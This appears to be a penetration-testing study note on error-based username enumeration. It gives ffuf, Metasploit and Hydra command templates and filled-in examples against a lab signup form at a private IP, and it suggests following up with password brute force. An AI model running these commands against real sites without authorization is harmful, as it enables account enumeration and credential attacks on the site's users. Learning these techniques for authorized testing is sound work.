---
tags:
  - Penetration-Testing
  - Web-Hacking
---
**Website Error Messages can be used to generate a list of valid usernames, depending on how errors are handled and what text is displayed**

![[Pasted image 20240724190731.png]]

Can point tools at the form, use fuzzing for username, and look for the "An account with this username already exists" message.

## Tools for Error-Based Username Enumeration

### ffuf
```bash
ffuf -w <path_to_username_list> -X <http_method> -d <data_to_send> -H <add_additional_headers> -u <request_url> -mr <error_text>
```
- Example
```bash
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X Post -d "username=FUZZ&password=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.156.124/customers/signup -mr "username already exists"
```

### Metasploit
```bash
use auxiliary/scanner/http/http_login
set RHOST
set TARGETURI
set USERNAME 'FUZZ'
set PASS_FILE <path_to_wordlist>
```

### Hydra
```bash
hydra -L <path_to_username_list> -p <dummy_password> http-post-form "<url_of_page>:username^USER^&password=x:<error_message>"
```
- Example
```bash
hydra -L /usr/share/wordlists/SecLists/Usernames/Names/names.txt -p 'x' http-post-form "10.10.156.124/customers/signup:username=^USER^&password=x:username already exists" 
```

**Results can then be used to attempt to crack passwords using traditional brute force techniques**